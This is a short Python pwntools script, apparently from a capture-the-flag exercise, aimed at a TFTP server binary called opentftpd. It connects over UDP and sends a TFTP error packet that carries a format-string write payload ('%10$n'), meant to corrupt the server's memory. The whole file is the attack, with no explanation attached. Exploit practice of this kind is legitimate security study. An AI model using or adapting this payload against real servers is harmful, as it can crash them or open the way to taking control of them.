#!/usr/bin/env python
import sys, os
from pwn import *
from time import sleep
from binascii import hexlify

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('0.0.0.0', 5566)
elf = ELF('docker/source/opentftpd'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

r = remote(HOST, PORT, typ='udp')

r.send('\x00\x05\x00\x00%10$n')

r.close()
